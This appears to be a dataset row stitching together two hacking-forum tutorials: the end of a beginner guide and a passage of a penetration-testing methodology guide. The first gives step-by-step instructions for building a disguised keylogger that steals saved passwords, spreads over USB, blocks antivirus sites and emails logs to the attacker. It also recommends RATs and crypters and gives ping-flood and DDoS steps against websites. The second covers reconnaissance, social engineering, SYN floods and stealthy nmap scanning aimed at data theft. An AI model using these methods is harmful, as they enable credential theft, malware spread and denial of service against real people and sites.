to be a Grey hat, be aware that some people wont believe you are really trying to help, and you may still get in trouble. The last and most difficult path is White hat. As I mentioned before, White hats are the good guys. Their job is to help. Becoming a White hat may seem boring but you are helping people, and that should be a reward in itself. The only problem with becoming a What hat is that you will have to start out as a Black hat. I personally would recommend that you start out as a Grey hat. Youll get more out of it. SECTION 5 - Where should I start? This is the question that most people ask. I honestly dont think there is any one place to start. Ask around on any forum and people will always tell you to learn to use RATs and keyloggers. To be honest I wouldnt recommend doing that straight away. I would advise to learn the basic terminologies of hacking (see section 6) and try to get an idea of exactly what everything means. Its really important to understand stuff before you go downloading random hacking programs from the Internet. It you dont know how to use them, or if they are viruses, you only have yourself to blame. SECTION 6 - Basic terminology As I mentioned in the previous section, it is important to have a decent amount of knowledge about hacking before you can start. So Ive taken the liberty of typing up a list of common terminologies you should know.  Common terminologies: Ddos - Distributed denial of service attack. This is where a website is flooded with packets of data from multiple sources and the server basically overloads. Ddos attacks are often confused with Dos attacks. Dos - Denial of service attack. This is where a site is flooded with packets of data from a single source. A Dos isnt as effective as a ddos, but it is a lot easier, as you can Dos straight from cmd. 404 Error - The error you are given when a site is down. If you have attacked a site and dont see this, your attack wasnt successful.  cmd - Command prompt. This is basically MS-Dos, except its now just a program with some commands rather than an OS. Cmd can be used to perform tasks using commands.  .bat - Batch file extension. This is the file type which is opened in cmd. Most .bats that you will see online will be malicious. Some are good though.  RAT - Remote Administration Tool. RATs are the most commonly used tools by beginner hackers. RATs are favored because they are easy to use and they perform many functions. They also allow control over of the infected computer, which makes them very popular. Slave - A user which has been infected with your keylogger/RAT.  Keylogger - A program which logs the keystrokes of a computer. These are usually the first things that beginner hackers learn to use. They have a lot of functions but they arent as good as RATs. Crypter - A program used to change the hash sum of a malicious program so that it is undetectable by anti-virus programs.  FUD - Fully UnDetectable. A program which is FUD cannot be detected by ANY anti-virus program. UD - UnDetectable. A program which is UD is mostly undetectable but can be detected by some anti-virus programs.  JDB - Java Driveby. A fake site which contains a java applet. This java applet is used to download and execute (run) a certain program. The victim as to click the allow plugin to run button to start the applet.  Silent Java Driveby - A java driveby thats downloads and executes a file without the user seeing any pop-ups. These are more effective than normal java drivebys as they are less suspicious.  Direct link - The direct download link to a certain file. When you download a file from a site (e.g. Mediafire), you are given a download link which redirects you to a page with a download button. However a direct link is a link which leads directly to the file. There is no download button, the download starts straight away.  FTP - File Transfer Protocol. An FTP server is a server used to store and send files.  OS - Operating system  vb - Microsoft Visual Basic. This is a coding language used to make a lot of programs.  .NET - Microsoft .NET framework. This is another coding language made by Microsoft. It is used to create programs.  C/C+/C++/C# - Commonly use coding languages. They are often used to code games.  IP address - The address used to identify your network while on the Internet. Every computer has a different IP address, and therefore every IP address is unique.  VPN - Virtual Private Network. This is a network you can connect to on a computer. It will give you anonymity while online. A VPN will hide your IP address by tricking sites and programs into thinking you are somewhere you are not.  Proxy - A proxy redirects web traffic through a virtual tunnel to another IP address. A proxy is like a VPN but only tricks websites, not the whole computer. That may seem like a lot of things to remember, but its not that much considering those are just the basics. Dont let that put you off learning though, once you start to learn one thing, another will follow and so on so forth. Keylogging Keylogging is one of the most basic things in hacking. I explained what a keylogger is in section 6. Downloading a good, free keylogger isnt that hard to do. Just search around HackForums and you will find one in about 30 seconds. I would recommend using SysLogger as it is free and really easy to use. It has many features and allows for the logs to be sent via Email or an FTP server. SysLogger has a really nice interface, so you should be able to figure out how to use it. However if you cant figure it out, or would like to know how to use it before getting it, here is a tutorial I typed up a while ago: Are your friends bothering you? Need to get back at someone? Or do you just want to learn some of the basics of hacking accounts? In any case, this thread will be INCREDIBLY useful to you. First of all, heres what this method will require and what it will involve: - Computer (duhh) - Internet connection - Keylogger, we will be using one called SysLogger - Target - Making a fake program that the target will want to open - An email (preferably a Gmail) So, lets get started.  First thing you will need is SysLogger. You can download it at the bottom of the thread.  Open it up. You will be given a message, just click OK. [Image: blAuM.png] It should open up the GUI.  [Image: iMtab.png] Tick the following boxes:  - Encrypt email - Stealers - Delete cookies - Block AV sites - USB spread - Startup - Kill Taskman (optional, leave blank if you want this to be more stealthy) - Force steam - Clipboard logger - Screen logger [Image: tvzP9.png] Those options will do the following: Stealers = Sends you saved passwords for internet browsers Block AV site = Stops the victim from checking an antivirus site if they get suspicious USB spread = Infects any USB devices plugged into the machine, so if they are put into other computers they will infect them Startup = Runs the keylogger every time the machine is switched back on Kill Taskman = Stops the victim opening task manager Clipboard logger = Saves anything copy/pasted Screen logger - Sends you a screen shot of the victims PC Next we have to tick the box called Enable Error. This will give the victim an error message when they open the file, make sure you put in something creative, but relevant the fake program. [img][Image: 83Kqa.png][/img] Click Test Error to make sure it is working. [img[[Image: gHmSR.png][/img] Now we need to fill in the mailing options. I recommend using mail as opposed to FTP because it is more secure and its a lot easier. Put in your email address and password. If you are using a Gmail you dont have to change the SMTP options, if you arent google the SMTP options for your email provider. Click test email, if a box pops up saying success, youve done everything right, if not, go back and do it again. There should be a box below that which says Interval. Set that to whatever time you want. [img][Image: 6sJIK.png][/img] Now click Change file properties. This will open up another GUI. Find an icon that suits your fake program here The icon changer might not work for everyone. If it doesnt, download a free icon changer from google. [img][Image: GZmy7.png][/img] Close the properties window.  Click Build Server. This will build the keylogging file. Make sure you have your antiviruses disabled as they will delete the file. You can reactivate them when you are done. Congrats, youve built the keylogger! Now all you need to do is send it to your victim and get them to open it! If you accidentally open your keylogger, just open up SysLogger and click Cure. Type in the name of the file and you will be cured. I hope you guys find this useful!  If you do, please post a thanks. Hope this helps you guys SECTION 8 - RATs RAT stands for Remote Administration Tool (though some people say it stands for Remote Administration Trojan). You can find a definition of what a RAT is in section 6. As I mentioned in that section, a RAT has a lot more functions than a keylogger. Using a RAT can also allow you to get photos of your slave if they have a webcam. I dont currently have a tutorial on how to use a RAT, so you will have to search for one yourself, sorry about that.  However I do recommend the following RATs:  • Dark comet (free)  • Blue banana (paid, but very cheap)  They are very easy to use and have many useful functions. In my opinion I think those are the best RATs around (that dont cost too much). SECTION 9 - Java Drivebys Java drivebys (often referred to as JDBs) are the easiest way to infect people with your RAT/keylogger. A detailed definition of a JDB can be found in section 6. But to sum it up in a few words, a JDB is a fake site that uses java to infect people. JDBs are incredibly easy to set up. All they need is a webhost which allows you to upload files. Some good free ones are 000webhost.com and dolphhost.com. I recommend 000webhost because it is easier to use. It also offers free domains. SECTION 10 – Crypters Crypters are programs which are used to change the hash sum of a malicious file so that they are not detected by anti-virus programs. Crypters which are FUD are better because they make files completely undetectable. UD crypters make the file mostly undetectable but some programs can still detect it. If you are thinking about setting up a JDB or any other method of spreading your RAT/keylogger, I recommend making your server FUD as it will increase the chances of actually getting slaves. If you want to get a crypter, there are a lot of free ones and paid ones around. I recommend getting a paid one as it will stay FUD for longer. SECTION 11 - Dosing and DDosing, whats the difference? People often get confused when they are asked to explain the difference between a dos and a ddos. It even confuses me a little bit but I will try my best to explain it. A dos is a simple denial of service attack. It takes a web page offline for a moment but the attack isnt distributed, so it wont affect everyone. It isnt that effective. However a ddos attack distributes the attack, meaning it will affect other people aswell. This is a much more effective way of taking down a site as it will affect more people.  If you want to know how to do either of these, there are a few different methods:  • Dosing program  • DDosing program  • Use cmd to ping the site  • Host booter  • Refreshing the page  I will be going over the following:  - Using a DDosing program (DDos)  - Using cmd to ping the site (Dos)  - Refreshing the page (Dos)  Using a DDosing program: There are a lot of programs that can do this. I recommend one called Goodbye. Its hard hitting and free. To download it go to:  Hidden Content:  You must reply to see links   How to use Goodbye: Find the URL of the site you want to DDos. Type in the site and then the page you want the traffic to go to.  Example: Site - website.com Page - /example.htm  Press \""Start \"" to start the attack.  Once the number of blocked packets is above 400 you should stop the attack as anything after that will be redundant (wont have any further effect).  Pinging the site: I couldnt remember this method off the top of my head so I have referenced a post made on NextGenUpdate.  1. Open cmd and type ping example.com ^Replace example.com with the site you want to attack  2. Write down the IP address that shows up.  3. So you would type this in ur cmd: ping XX.XXX.X.XXX -t -l ##  ^Replace XX.XXX.X.XXX with the IP address you want to attack  ^^Replace ## with the amount of time you want to send the attack for. The longer the attack, the more effective it will be.  4. Allow the process to finish. Check back a bit later to see if the site is down.  Refreshing the page: You are probably thinking Im an idiot for posting this method, but its probably not what you expected it to be.  Id like to point out that this method does not involve:  • Pressing F5  • Clicking refresh  So... You guessed it. We will be using an auto-refresher. I recommend Auto-Refresh Plus in the Chrome webstore. Download it and select custom time. Set it to 1 second. This will reload the page every second, and eventually overload the server. This may take some time. SECTION 12 - Staying anonymous Staying anonymous while online is something that many people cant seem to do. Every day, I go on HF and look through the beginner hacking section. And every time I see 10-20 threads all asking the same sort of thing. \""How to hide IP?\"" \""Change IP?\"" \""Free VPN?\"" \""How to staying anonymous?\"". And I always see the same replies. \""Damn kid. Doesnt even know how to use a proxy\"" \""We are not your army\"" \""Ever heard of this magical thing called Google?\"" \""Use the search button before posting\"". For those of you that encounter that sort of thing, I hope the following sections answer your questions. First off, why is it important to stay anonymous? Well, this question shouldnt really need answering. If you dont stay anonymous, your effectively allowing people to steal your identity. Its important to cover your tracks while online because there will always be somebody there, waiting to exploit even the first slip-up they see. Moral of the story: STAY ANONYMOUS!! The following 4 sections will teach you how to do that. SECTION 13 – Proxies Everyone has heard of proxies. Thing is, most people have no idea how to use them. Before I show you how to use a proxy, I will explain a little bit about what a proxy is and what it does. Every network has its own IP address. When you visit a website, it logs your IP address. Now, some websites dont like certain IP addresses to access them. So they block that IP address from accessing the page. What a proxy is, is basically a tunnel that all the traffic from that page goes through. The tunnel sends the traffic to another IP address. This tricks the website into thinking that the IP address at the end of the tunnel is yours, and allows you access to the page. Now that you know what a proxy is, you can set one up. First off, find a proxy (free proxies can be found at  Hidden Content:  You must reply to see links ). Every (common) browser has proxy settings, so find your browsers proxy settings area. For Google Chrome, go Tools-->Advanced-->LAN options-->Proxy settings. Type in the proxy then select the appropriate settings (e.g. HTTPS or Socks5). Then you need to restart Chrome (just close it then open it again). Go to  Hidden Content:  You must reply to see links  to check if the proxy is working properly. If it is, it should display a different IP to your actual one. SECTION 14 - VPNs Many of you have probably heard of VPNs before. For those of you who dont know what they are, VPNs are VirtualPrivateNetworks. A detailed explanation of what they are can be found in section 6. Connecting to a VPN is really easy.  I will teach you how to connect to a VPN on:  • Your PC  • Your iDevice  Before I teach you how to do that, you will need to find a VPN to use. Here is a list of VPNs you might want to try.  Free VPNs:  •  Hidden Content:  You must reply to see links  Best Canada VPN  •  Hidden Content:  You must reply to see links  HideMe.ru •  Hidden Content:  You must reply to see links  Hotspot Shield  Paid VPNs:  •  Hidden Content:  You must reply to see links  HideMyAss  •  Hidden Content:  You must reply to see links  VPN  •  Hidden Content:  You must reply to see links  OpenVPN How to connect to a VPN on your PC: This will teach you how to connect to a VPN on your PC.  - Click on the WiFi icon on the taskbar.  - Select the option ‘Open Network and Sharing Center’  - Click ‘Connect to a new connection or network’ - Select ‘Connect to a workplace’ and then click next  - Click next - Select ‘Use my internet (VPN)’ - Type in the address of the VPN you want to connect to  - Type in the username and password then click Connect - You should see the screen  You’re done! This should appear.  How to set up a VPN on your iDevice:  Heres how to connect to a VPN using your iDevice. For this tutorial we will be using the free VPN, BestCanadaVPN. I will be going over all the steps needed to set this up and a few other things. First off, you need to open up settings. Now go \""General\""-->\""Network\""-->\""VPN\"" Now tap the \""Add VPN configuration\"" button. It will bring up this menu. Now fill in the boxes with these. Description: VPN Server: bestcanadavpn.com Account: free Secret: (put anything here) Now we need to get the password. So open up safari and head over to bestcanadavpn.com You will see the password on the homepage. Now type the password into the \""Password\"" box in the VPN configuration. Now tap \""Save\"". Congratulations! You have just set up the VPN on your iDevice! Now you need to connect to it. To do that just press the \""On\"" button. Once you are connected, it will say so and a VPN icon will appear in the status bar. ***PLEASE NOTE*** The VPN password changes every 24 hours. Using a VPN will provide a significant amount more protection that a proxy, but wont make you completely untraceable. SECTION 15 – Alternatives, tips and tricks This section will cover some of the alternatives to proxies and VPNs. These methods are probably a little bit harder to use, but they are just as good (if not better).  Change your IP Most routers have a setting which allows you to clone your MAC address and set it as your IP address. This allows you to hide your location and disguise it as. Use anonymous web searches Some sites offer anonymous web searches. This doesnt offer very good anonymity, but hey, its better than nothing.  Ctrl+Shift+Delete  This amazing little shortcut can clear cookies and data, web history and autofill data incredibly quickly! Its great and takes almost no time to do.  Put Tor on a USB  Tor is a network which provides anonymity while on the Internet. Most schools will not allow you to download it and install it. So just download it onto a USB at home and run it when you get to school. Your school wont have a clue what you are doing online!  Use private browsing  Most browsers have a private browsing option. This opens up a session which doesnt save cookies, and cant be tracked in an administrator system. Its great because anyone can use it.  Double Desktop Switcher  Yup, everyone knows this one, but it does work! Download Double Desktop Switcher onto a USB and bring it to school. You can do whatever you want and when a teacher walks by just press the hotkey to change screens.  Use your mobile/iPod  Most schools think they are smart an monitor all the traffic on their computers. The reality is that they are dumb idiots as they dont monitor mobile traffic. I have downloaded torrents and done a whole bunch of stuff on my iPod and my school hadnt had a clue!  Use public computers  Dont do hacking stuff from home. Go to an Internet cafe or the library. Bring all your stuff on a USB and run it from that.  Combine methods  If you seriously want to stay safe while online, try this: Go to a public place and use a public computer. Sign in with fake information. Connect to a paid VPN. Go online using private browsing. Then set up your browser so it used a paid web proxy. Open up Tor on your USB. Go to a site which offers anonymous web searching. With all of that, your Internet will probably be so slow its unbearable, but you will be anonymous!!!! Oh yeah... did I mention that all of these will slow your internet connection speed? No? Too bad.  I’m kidding. They will slow down your connection, but not by very much, so the trade-off is worth it.  SECTION 16 – Extending your knowledge  “Don’t learn to hack, hack to learn”. You’ve probably seen that posted all around the internet. To a certain extent, it’s true. Hacking is often used to gain knowledge you wouldn’t otherwise be able to know. However if you don’t learn to hack, how can you hack?  This section will help you discover ways to extend your knowledge of hacking. Now, in order to do this, you will need to spend extensive amounts of time browsing the internet. There’s no other way. There are also no shortcuts. If you don’t put in the work, you won’t get the results. End of story.  Now that we’ve got that out of the way, let’s begin.  Since you’re probably too lazy to use google, here are some useful sites:  • Hackforums.net  • Crackhackforum.com  • Hackthissite.org  Those are pretty much the only sites you will need to start off with. They have almost ENDLESS supplies of knowledge, and have relatively friendly members. Sign up for those sites and you’ll be well on your way to becoming a successful hacker.  SECTION 17 – Closing section Congratulations, you’ve finally reached the last section! I bet it took you a while to read through all of that, but you’ve probably learned a lot too. Now most of my knowledge has been passed down to you. I put a lot of time and effort into typing this up (7 hours to be more precise), and spell-checked this over 50 times. I even added images in (lucky you) so this guide would be easy to follow. So please, post a short thank you message in the original thread. That takes 30 seconds, this took 7 hours.  Remember, knowledge is power. But if you misuse that power it will be taken away from you. Stay true to yourself and the world will do so aswell. """
0	How to Hack Websites & Servers from Scratch!!! Step by Step Tutorial for Beginners	"""   Another Great Tutorial NOT MINE Im going to provide the common methodology that is followed when hacking a machine/network/server. This tutorial will give you a good understanding & an overview about professional penetration testing in a black box (attacker) point of view. It is designed to give you an idea on how an attacker can break into your system, what I am gonna say will increase your awareness & will open the door for you to go out & educate yourself easily. I gathered this information from various sources and tutorials, i have changed many things, clarified many parts, given some references, and put a lot of information together. Im still a learner & on the way to my goal. However, this wont prevent me from teaching others what i have learned so far & dont worry, im not going to provide you with any info that im not sure about yet. It is not the best tutorial out there, but at least it is a good starter. I will speak in a hacker (attacker or blackbox) point of view. I write this tutorial for educational purposes only. Since im not a native speaker, expect to see lots of grammar and spelling mistakes. EDIT: THIS TUTORIAL HAS BEEN EDITED BY PSINETIC FOR BETTER GRAMMAR AND SPELLING. Before you hack a system, you must decide what your goal is. Are you hacking to put the system down, gaining sensitive data, breaking into the system and taking the root access, screwing up the system by formatting everything in it, discovering vulnerabilities & see how you can exploit them, etc ... ? The point is that you have to decide what the goal is first. The most common goals are:  1. breaking into the system & taking the admin privileges. 2. gaining sensitive data, such as credit cards, identification theft, etc. You should have all of your tools ready before you start taking the steps of hacking. There is a Unix version called backtrack. It is an Operating System that comes with various sets of security tools that will help you hack systems (penetration tests). You should set the steps (methodology) that you plan to take in your journey before you do anything else. There is a common methodology followed by hackers, i will mention it below. However, you can create your own methodology if you know what you are doing. Common steps to be taken for hacking a system: 1. Reconnaissance (footprinting). 2. Scanning. 3. Ports & Services Enumeration. 4. Vulnerability Assessment. 5. Vulnerability Exploitation. 6. Penetration and Access. 7. Privilege Escalation & owning the box. 8. Erase tracks. 9. Maintaining access. The above methodology can change based on your goals. Feel free m8! Before you break into a system, you have to collect as much info as you can on the system and target. You have to study your target well before you hack. This step is called Reconnaissance. Reconnaissance is achieved by using techniques & tools that are undetectable by the target. You are gathering your targets info that is publicly published, e.g. browse your targets website & if they are looking for an SQL employee and Windows server admin, then you get a hint that they are running Windows Server & do SQLs, this is called a \""passive\"" action. Lets see an example of active action! Example of active action: call the company to obtain some info, visit the company, email employees to get some info, go to the targets website & read its source code. In other words, passive action means you gather info in a non-intrusive manner. Active action is a step further, such as talking to the company as if you are a customer, things like that. It is not really important to know what action is passive & what is active, the main goal here to gather info! Simple huh? Good, let me go deeper little bit. In passive reconnaissance, there is a 0% chance of getting caught ;-), as you only target publicly available info to give you the feel on what your target looks like. The type of info you can gather through Passive Recon. are, names, phones numbers, location addresses, partner networks, and much more. This can aid you when you want to do some social engineering! Hence, sometimes you can get some non-public info thats revealed when you do passive reconnaissance. There are several tools helps you to do passive reconnaissance, such as whois (who is). Whois helps you obtain extensive info, such as names, domains of the target, etc. Other great tools are, Sam Spade, domaintools, and google(can reveal lots of target subdomians & many more). Active reconnaissance goes beyond the passive nature, such as communicating with the target without being caught, such as scanning. Anything not discovered in IDS(Intrusion Detection System) is considered active. You have to think of ways to extract info of the company in a normal way, public by going a little bit deeper than passive recon. e.g. you can go to the physical location, do some social engineering, email staff, communicate with employees based on the info youve gotten on your passive recons. Things like that! Example of some techniques for active reconnaissance, such as banner grabbing, view companys public website source code and directory structure, social engineering, shoulder surfing, etc. What the heck is banner grabbing? You let the server send you a block of information that tells you OS version of your target system & various association with it Banner tells OS version and various association. Anything listening on a \""port\"" can determine the operating system (OS) \""the port\"" is running on, this called fingerprinting. In other words, fingerprinting is the process of determining the operating system (OS) or applications used by a remote target.  Learn more about banner grabbing: Hidden Content:  You must reply to see links Can you give a brief example of Social Engineering? For example, you try to find out where IT admin goes after business hours, then start to go to the place he goes & build a relationship , start making a friend relationship to extract more info slowly but surely, things like that! you know what i mean. What is shoulder surfing? Simply, stand behind a persons shoulder and see what the guy is doing & typing on the keyboard. This can happen in a wireless network area where everyone is using a laptop in public areas. In summary, reconnaissance is one of the most important steps in hacking. The main concept is to gather all the info that is publicly available or easily obtainable. Info that we gather will help us in social engineering and research purposes which will lead you to very critical info about the system. It starts by obtaining names, phones, emails, IP range, domain structure, and so on. let me show you how banner grabbing is done, telnet into your target server on port 80 as the following, go to command line or terminal and type telnet xx.xxx.xxx.xxx 80 Now the connection is established, that stupid server thinks you are a web browser connected to it, it waits you to enter commands so the server can you give you info about your request. In this situation, you have to write a command that says \""Hey you web server, give me content of such and such website\"". However, we do not really want to visit the website through telnet, do you? You can just go to web browser & request the website from there. Our purpose here is to freak the server out enough, so it spits back a code that says, hey! this doesnt work but here is some info that might help you do some trouble shooting. This technique allows you to fingerprint various components of the target system.  Note: instead of telnet xxx.xx.xxx.xx 80, you can do nc xxx.xx.xxx.xxx 80! Its the same thing ... nc stands for netcat ... xx.xxx.xx.xxx represents the IP address of the target system. After you do telnet xxx.xx.xxx.xxx 80, the remote sever will wait you to enter a command.

You can start the exploitation process ;-) ... Another example, use program called sam-spade which gives you alot of info about your target. The target does not know actually what we are doing against their server, since they havent seen anything been triggered by IDS or Firewall. *What is the difference between IDS & Firewall? An IDS (Intrusion Detection System) may only detect and warn you of a violation of your privacy. Although most block major attacks, some probes or other attacks may just be noted and allowed through. Theres also an evolution of the IDS called an IPS (Intrusion Prevention System) that watches for the same things an IDS does, but instead of just alerting, it blocks the traffic. A good firewall will block almost all attacks unless specified otherwise or designed otherwise. The only problem is, the firewall might not warn you of the attacks and may just block them.  It may be a good idea to have both an IDS and a Firewall, because the IDS will warn you and then the firewall will block the attack. Over the years, firewalls gottten more complex and added more features. One of these features is actually IDS - today you can have a firewall that already has IDS(Firewall/IDSs are combined into one internet security program).

Alright, now you at least have an idea of what reconnaissance is! lets talk about scanning... When you scan your targets network, you actually start touching the system. Scanning a network determines whats in there, scanning network gives you the feel of how your targets network is laid out, if there are multiple subnets, which hosts are alive, check ports, see if system is alive, discover available hosts & get info about the discovered hosts. There are thousands of tools can be used to scan networks! Scanning a network can easily get picked up by IDS. Anyhow, no one will pay attention except if you do it over and over because scans happens on such a regular basis on the internet. Therefore, people who read the logs, i means the webmaster wont really pay attention to every single scan that occurs, so you dont have to worry alot. There are ways to avoid being picked up by IDS :-). After you finish scanning, you will gain a list of network nodes that exists there. \""Node\"" is an active electronic device that is attached to a network, and is capable of sending, receiving, or forwarding information over a communications channel. If you want to learn more, google it or visit  Hidden Content:  You must reply to see links  ... Ok now we want to discover live hosts via scanning. This is the first action taken against your targets network. Depending on what method of scanning you use, you can be detected by IDS. Most admins will ignore detections because it happens alot unless something abnormal happens. EDIT: TEMPORARY STOPPING POINT OF GRAMMATICAL EDITING There are various scanner tools, e.g. nmap, superscan, and many more. There are various scan methods, some are stealthy, others are not. Before i talk about various scanning methods, let me explain to you about TCP connections basics. When you scan your target using TCP communication, there are six TCP flags can be utilized during packet transmission(packets get transmitted during scanning process). A flag will indicate whether the sent packets are syn, ack, fin, urg, psh, or rst packets. These packets sets you in a position on how you want to communicate with the remote host. You can get different info depending on the flag you choose for the scanning.  TCP establishes three handshakes, syn, syn-ack, ack. What are they? When you scan your target using TCP communication, you send a syn packet(syn request), and then target sends you back an ack packet with syn packet. Now, you send an ack packet to the target. So now both machines establish the connection well, like they have made a well established tunnel for a proper guaranteed communication without losing any packets during communicating with each other. A hacker can get caught easily if he uses this method to hack other systems illegally. Hackers use non-standard combination of these six flags, which gives them info that are not normally available to the public.  Have you heard about syn flood?  syn flood is done by utilizing three handshake by sending \""syn\"" request to the target, so the target receives a syn request and send an a syn-ack back to the originator(you). You ignore the target syn-ack request - when you ignore it, then the three handshakes is not completed, this is called half open TCP connection - In theory, when the target sends you syn-ack, the target allocates some RAM on its machine.  The amount of RAM on the target machine must be open until it gets response (ack packet) back from you because till now only two handshake has been made,so the TCP connection process is not completed yet. However, there is always a time limit for the RAM to be opened, so if 30 secs passed by & the target did not get the ack from you, the connection will abort(failed TCP handshake - timeout) & RAM will be deallocated.  The idea here is to send hell alot of packets in few secs so in 30 secs, you can send 40 million packets(lets say one packet size is 1kb) which is heavy on the RAM since the RAM might not have enough memory to carry 40 million packets. Therefore, you force the target to make half open TCP connection attempts, so definitely the target machine will stop responding to legitimate request. In other words, if you send 40 million syn requests to that remote host, its going to allocate a hell of a lot of ram for those requests. After a while, its going to eat up all of the ram. Thus, target system goes down. This is called syn flood attack.  In short, syn flood attack makes the system (i.e. the IP stack or kernel) chokes on the memory allocations (or simply runs out of memory) or the target application (i.e. web server) chokes on the processing load. You got it? Or not yet?! Syn flood is an old technique i just mentioned it here for illustration purposes. General Information: these days, SYN floods are used to make systems inaccessible. They have a limited number of half open connections, you use them all, and they cant accept any more SYNs. But again, modern software throws away old SYNs once the limit is reached. Note that different systems will behave differently. If you interested in learning more about syn flood, visit Hidden Content:  You must reply to see links Lets talk about the most common TCP Scan types. There are full scan, half open scan, stealth scan, Xmas scan, and ack scan. full scan: this completes 3 way TCP. it is the most effective & gives more accurate results. However, it is not safe and easily traced and detected. half open scan: it is the second most effective scanning method, only uses first part of the handshake to get syn-ack but does not send 3rd part (ack) back to the remote host. The idea here is if the remote replies back to you after you have sent syn request, this means the port - we sent the syn to - must be open.  stealth scan: the idea here is to scan ports randomly(not in sequential order) & reduce the speed of scanning. If you scan all port from 1 to 65536 in sequence, your more visible to be detected, and usually scanning happens so fast, which is unusual since regular program does not connect to port that fast, so this can make it easier to be detected. Therefore you have to scan ports randomly & reduce the speed of scanning. To avoid IDS, you should not use full connection scan with stealth scan, you can use half-open scan(syn). syn is considered a stealth scan. In fact, syn scan is called syn-stealth scan, or you can use Xmas scan with stealth scan which helps you to evade detection, things like that! you get my point i guess. Xmas scan: uses fin, urg, and push flags which are used to bypass some firewalls. Xmas scan works with UNIX system, it does not work with Windows system. ack scan: this helps you evading IDS not to get you detected. You send only an ack packet to your target, your target wont know how to deal with it since there was no handshake. Thus, ack scan causes open ports in your target machine to return a reset packet(rst), rst packet gives you a hint that the port or service is not filtered between point A and point B, which usually firewal resides in between! Since the port replied you with rst packet this means there is no firewall between A(your machine) & B(port or service on the target machine) and rst packet also gives you an insight that the target port is open ;-). If there is a firewall, your ack packet would not reach to the target port & because of that you wont get any rst packet. In addition, rst packet helps you indentify what system is running on the remote host. These are the most common method of scans, there are hundreds of scanning methods! nmap allows you to set your own custom scan type e.g. instead of sending ack flags only, you can send ack flag and rst flag together and see what you get back from target ... OK! we have talked about how TCP scanning works in general. Now, i will be talking about UDP & ICMP Scanning ... UDP and ICMP connections most of the times are blocked at the firewall level & even at the host level in some cases. We are going to scan on hosts & ports that respond via UDP. When you scan your target via UDP, there are many problem will occur during that process e.g. you can scan over the ports via UDP, assume you scanned port 1, and port 1 is closed, then host will send ICMP unreachable back to you, which gives an insight that port is closed because you didnt get any UDP response back from target! Making sense,right? Unfortunately, we will never get a response back from target to ensure you that port is open! Thats how UDP call works, send the packet & forget it. Lets say we come across port 21, and 21 is open, then port 21 on target machine will not reply back to you because UDP does not give you the guarantee the delivery packets during communication process, it just send the packet and forget, unlike TCP which guarantees the delivery of packets with no loss or corruption. Since we didnt get reply back, then we can assume the port 21 is open *OR* maybe port 21 is closed and ICMP reply got lost somewhere so we didnt get it! A general rule, when you dont get a reply you assume port is open.  Some high professionals security person purposely configure ports to not to respond a UDP scanning. ICMP scanning is as same as UDP. ICMP scanning is noisy & can be picked by IDS very easily because ICMP sends random several pings to the network instead of a single host(ICMP scanning does a ping scanning - sends ICMP packets - to the whole network instead of a single host). After you finish ICMP scanning, based on the replies you get back from the live hosts, then you can determine that your target network is listening for ICMP traffic and you might to do some exploit based on that. Unfortunately, there arent alot of ICMP exploits going around, so you are just going to use ICMP for network enumeration, you just do it to see what hosts are up, host A is up , host B is up & host C is up, they are replying for my ICMP. Thus, this let us know these 3 hosts are running on the targeted network and potentially can be a target for us. IDSs are always listening for network scans & alot of network scanners provide a support for ICMP scanning, but do not have a way to make it stealthy! Therefore, ICMP can turn on the IDS alert which tells the security person there is somebody scans your whole network. nmap is a great tool that is very popular, it is usually used to scan networks, hosts, ports, and does alot of other stuff. It is very intrusive tool and considered a hacking tool. Using nmap against systems you dont own or dont have permission to scan can be considered illegal. Lets see examples of some scanning method! Example of ICMP Scanning(-sP) - this is called ping scan nmap -v -sP xx.xxx.xxx.xx > filename nmap: represents the program we are running which nmap. -v: for increased verbosity, which means bring me extra details of the targeted system. (Optional - as far as i know) -sP: the flag that determines the scanning method. xs: target IP address. > filename: output the results to the newly specified filename. In other words, save results in a file (Optional) This above command shows you the systems that are up and running, so this shows what available to us on the targeted network. As a result, you will get simple info that shows you there are number of IP addresses that responded to ping request - Note: there could be alot more machines out there that are not responding to ICMP scanning. Lets see an example of UDP scan, UDP scan not so speed. nmap -v -sU xx.xxx.xxx.xx Results of UDP scan(-sU) give more info than ping scan(-sP). Keep in mind there could be hundreds of other ports are listening on the system which simply dont respond to UDP connection. Useful sources relates to scanning methods via nmap: Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links ALRIGHT, now you have a good basic understanding about scanning! Next, i will be talking about fingerprinting! So keep learning :-)  Now lets get deeper! By now we have determined what nodes are running up on the network. So we are ready to gather large info on those live systems we discovered in the previous steps. Ok! now you need to discover what services (application) are running on your targets host. Every (or at least many) port has a service running on it. For example, web server usually are running on port 80. What we have to do is scan ports, see what kind of services(applications) are running on them, try to grab the versions of the services, this will help you to determine the OS as well. This is called Port & Service Enumeration(fingerprinting). We have to do this step to understand what potential vulnerabilities your target has & how to exploit them. Assume after we have scanned our target system, we found our target runs \""IIS 5.0 Server\"" on \""port 80\"". Based on the scanning result, you can say the targer server is running IIS 5.0(IIS is set of Internet-based services, IIS is the second most popular web server - IIS is a Microsoft product), it is known IIS 5.0. has too many vulnerabilities & IIS 5.0 runs on Windows 2000, which Windows 2000 by itself has hundreds of vulns. In other words, lets scan ports and services, and do OS fingerprinting, lets identify services on those live host in our target network. Once we know what services are running and what OS are running then we can start exploiting these services! - ping/port/service scans are frequently run together using the same tool.  NOTE: identifying ports & services is the most critical part in hacking ... PERIOD OS fingerprinting is used for determining OS type and version, then we exploit vulns. that resides into the OS. When you fingerprint a target, your targets OS can be known from the TCP/IP stack, so fingerprinting happens on TCP/IP stack. Why? Because each OS has a unique implementation of TCP/IP, so TCP/IP stack is implemented differently from OS to OS, so an exact same query sent to one machine the respond of the result will be different than the other machine. Therefore, based on the response this can help the scanner determines the OS of the target, because every OS has its own unqiue response when you do OS fingerprinting request.  When you do a default install of OS, certain services will be installed by default, services that are needed for that OS to work properly, e.g. ports 137,138,139,and 445 which all combined together to produce Win 2000 OS or above. Another example, a combination of 139 and 445 can determine a certain version of windows such as Win XP or Win 2003, there are lots of ways to determine OS. Another example, if you see a service MS SQL is running on a certain port, you can determine the target OS is not in *nix family, it is in a Win family cause the target is running a Microsoft sql product. Thus, we can say port enumeration or service enumeration can help you in determining OS. There tons of popular scanners out there: SuperScan - Works good on Win OS. Nmap - Works on *nix & Windows, *nix version is much more stable than Win version. Most scanners offer full, half, stealth, and UDP scans. You are goning to spend most of your time scanning your target machine to know whats available there, so you can exploit the vulns & penetrate the system. Therefore, you have to do some exploration on scanning methods & decide which method of scanning you feel more comfortable with... Lets see an example of enumeration style scanning. Just keep in mind, this can be considered hacking! Make sure you do to your system, not 